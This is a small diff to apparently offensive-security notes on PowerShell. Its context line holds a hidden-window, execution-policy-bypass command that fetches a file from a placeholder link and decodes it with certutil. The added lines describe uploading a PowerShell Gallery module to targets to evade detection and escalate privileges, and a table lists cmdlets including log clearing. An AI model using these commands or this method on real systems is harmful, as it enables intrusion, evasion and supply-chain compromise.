@@ -30,3 +30,7 @@ powershell -NoP -W H -Ep Bypass irm LINK -O $env:USERPROFILE\e.txt;certutil -f -
 | Get-Process             | Retrieves a list of all active processes on a local or remote computer                               |
 | Clear-EventLog          | Deletes all of the entries from the specified event logs on the local computer or on remote computers |
 | Clear-RecycleBin        | Deletes the content of a computer's recycle bin                                                       |
+
+# Attack Vectors:
+
+- Upload PowerShell Gallery module and import it onto targets systems. This method allows widge range use as most Windows computers has PowerShell enabled. This method also exploits trusted Windows applications, making it harder to detect. This method could also potentially assist in elevated privileges.
